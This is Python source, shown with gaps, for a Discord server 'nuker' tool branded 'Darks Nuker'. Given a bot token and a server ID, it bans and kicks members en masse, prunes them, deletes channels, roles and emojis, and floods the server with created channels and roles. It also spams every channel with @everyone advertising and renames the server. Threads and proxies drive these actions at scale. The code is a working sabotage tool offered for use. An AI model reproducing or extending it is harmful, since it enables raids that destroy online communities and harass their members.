...
dostilodepe = ["darks.4sure.", "DARKS NUKER <3", "DSC.GG/nctop"]
leak = itertools.cycle(dostilodepe)

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, aizer, __config__, mohit= cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
os.system("cls") if os.name == "nt" else os.system("clear")
token = input("{}({}Darks{}) Enter Token{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
guildid = input("{}({}Darks{}) Guild ID{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
os.system("cls") if os.name == "nt" else os.system("clear")
...
Thallium_art = """
                            ...
                            ╔═══════════════════════════════╗                  {}╔╦╗╦ ╦╔═╗╦  ╦  ╦╦ ╦╔╦╗{}                      ╔═════════════════════════════╗
                            ║        {}gg/nctop  {}              ║                   {}║ ╠═╣╠═╣║  ║  ║║ ║║║║{}                      ║         {}Version: 4.0{}        ║
                            ╚═══════════════════════════════╝                   {}╩ ╩ ╩╩ ╩╩═╝╩═╝╩╚═╝╩ ╩{}   [{}darks.4sure.{}]      ╚═════════════════════════════╝
                            ╔═══════════════════════════════╦═══════════════════════════════╦══════════════════════════════╦═════════════════════════════╗
                            ║ ({}01{}) Ban Members              ║ ({}02{}) Delete Channels          ║ ({}03{}) Kick Members            ║ ({}04{}) Prune Members          ║ 
                            ╠═══════════════════════════════╬═══════════════════════════════╬══════════════════════════════╬═════════════════════════════╣
                            ║ ({}05{}) Create Channels          ║ ({}06{}) Spam All Channels        ║ ({}07{}) Create Roles            ║ ({}08{}) Delete Roles           ║ 
                            ╠═══════════════════════════════╬═══════════════════════════════╬══════════════════════════════╬═════════════════════════════╣
                            ║ ({}09{}) Delete Emojis            ║ ({}10{}) Rename Guild             ║ ({}11{}) Rename Channels         ║ ({}12{}) Rename Roles           ║ 
                            ╚═══════════════════════════════╩═══════════════════════════════╩══════════════════════════════╩═════════════════════════════╝
                            ╔═══════════════════════════════╗                   {}╔╗╔╦ ╦╦╔═╔═╗╦═╗╔═╗{}                         ╔═════════════════════════════╗
                            ║ ({}13{}) Check Updates            ║                   {}║║║║ ║╠╩╗║╣ ╠╦╝╚═╗{}                         ║ ({}14{}) Credits                ║         
                            ╚═══════════════════════════════╝                   {}╝╚╝╚═╝╩ ╩╚═╝╩╚═╚═╝{}                         ╚═════════════════════════════╝
                            ╔═══════════════════════════════╗                                                              ╔═════════════════════════════╗
                            ║ ({}15{}) Exit                     ║                                                              ║ ({}69{}) discord.gg/nctop        ║
                            ╚═══════════════════════════════╝                                                              ╚═════════════════════════════╝                               

""".format("\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m",
            "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", 
            "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m",
            "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m",
            "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m",
            "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m",
...
class Darks:
    ...
    def execute_ban_with_reason(self, guildid: str, member: str, token: str, reason: str):
        payload = {
            ...
            "reason": "Darks Nuker || dsc.gg/nctop  "
        }
        while True:
    ...
    def menu(self):
        os.system(f"cls & title Darks Nuker ^| Authenticated as: {aizer.user.name}#{aizer.user.discriminator}")
        print(Thallium_art)
        ans = input("{}({}Darks{}) Option{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")) 
        ...
        if ans in ["1", "01"]:
            ...
            for member in members:
                t = threading.Thread(target=self.execute_ban_with_reason, args=(guildid, member, token, "Darks Nuker || dsc.gg/nctop  ")) 
                t.start()
            ...
            members = open("members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick_with_reason, args=(guildid, member, token, "Darks Nuker || dsc.gg/nctop  ")) 
                t.start()
                while threading.active_count() >= mohit:
                    t.join()
            ...
            days = int(1)
            reason = input("{}({}Darks{}) Reason{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            self.execute_prune(guildid, days, token , reason)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["5", "05"]:
            type = input("{}({}Darks{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            chaizer = (input("{}({}Darks{}) Channels Name{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")))
            amount = int(input("{}({}Darks{}) Amount{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")))
            self.channels.clear()
            ...
            raizer = (input("{}({}Darks{}) Role Name{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")))
            amount = int(input("{}({}Darks{}) Amount{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
            ...
            time.sleep(3)
            print("{}({}Darks{}) Created {}/{} roles".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Darks{}) Deleted {}/{} channels".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            ...
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles_with_reason, args=(guildid, role['id'], token, "Darks Nuker || dsc.gg/nctop  "))
                t.start()
                while threading.active_count() >= mohit:
                    t.join()

            time.sleep(3)
            print("{}({}Darks{}) Deleted {}/{} roles".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            ...
            time.sleep(3)
            print("{}({}Darks{}) Deleted {}/{} emojis".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            ...
            amount = int(input("{}({}Darks{}) Amount{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")))
            Aizer1 = (input("{}({}Darks{}) Content{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m")))
            Aizer = Aizer1 + ('\n @everyone **Darks Nuker Runs Cord ** https://dsc.gg/nctop  ')
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            ...
            time.sleep(2)
            print("{}({}Darks{}) Spammed {}/{} messages".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1)
            self.menu()

        elif ans in ["10"]:
            new_guild_name = input("{}({}Darks{}) Guild Name{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            self.execute_rename_guild(guildid, new_guild_name, token)
            time.sleep(1)
            self.menu()

        elif ans == "11":
            nchn = input("{}({}Darks{}) Channel Name{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            type = input("{}({}Darks{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            ...
            nrole = input("{}({}Darks{}) Role Name{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            ...
            print("{}({}Darks{}) Developed By darks.4sure. || Join :- https://dsc.gg/nctop   || You-tube :-  https://youtube.com/@pakontop459?si=79BrC6Xwb9T4zAGl".format("\x1b[0m", "\033[90m", "\x1b[0m"))
            input("")
            self.menu()
...
@aizer.event
async def on_ready():
    print("{}({}Darks{}) Authenticated as{}: {}{}".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m", f"{aizer.user.name}#{aizer.user.discriminator}"))
    update_status.start()

@tasks.loop(seconds=5)
async def update_status():
    virus = next(leak)
    await aizer.change_presence(activity=discord.Game(name=virus))
